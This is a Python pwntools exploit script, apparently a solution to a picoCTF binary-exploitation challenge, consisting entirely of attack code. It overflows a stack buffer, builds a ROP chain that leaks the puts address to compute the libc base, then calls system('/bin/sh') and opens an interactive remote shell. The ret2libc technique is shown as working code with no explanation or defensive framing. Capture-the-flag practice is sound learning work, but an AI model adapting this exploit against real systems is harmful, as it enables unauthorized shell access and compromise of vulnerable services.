from pwn import *
import sys

host = 'mercury.picoctf.net'
port = 1774

libc = ELF('./libc.so.6')
elf = ELF('./vuln')
p = remote(host, port)

p.recvline()

p.sendline(b'random_shit')
p.recvline()

pop_rdi = 0x400913
pop_rbp = 0x4005f8
bss = 0x601800
ret = 0x40052e

offset = 136
func = 'puts'

payload = b'A' * offset
payload += p64(pop_rbp)
payload += p64(bss)
payload += p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.symbols['puts'])
payload += p64(ret)
payload += p64(ret)
payload += p64(elf.symbols['do_stuff'])

p.sendline(payload)
p.recvline()

leaked = p.recvline()[:-1]
leaked += b'\x00' * (8 - len(leaked))

leaked_func = u64(leaked)

log.info(f'Leaked {func} address : {hex(leaked_func)}')

libc.address = leaked_func - libc.symbols[func]

payload = b'A' * offset
payload += p64(pop_rbp)
payload += p64(bss)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['puts'])
payload += p64(ret)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.recvline()

p.interactive()

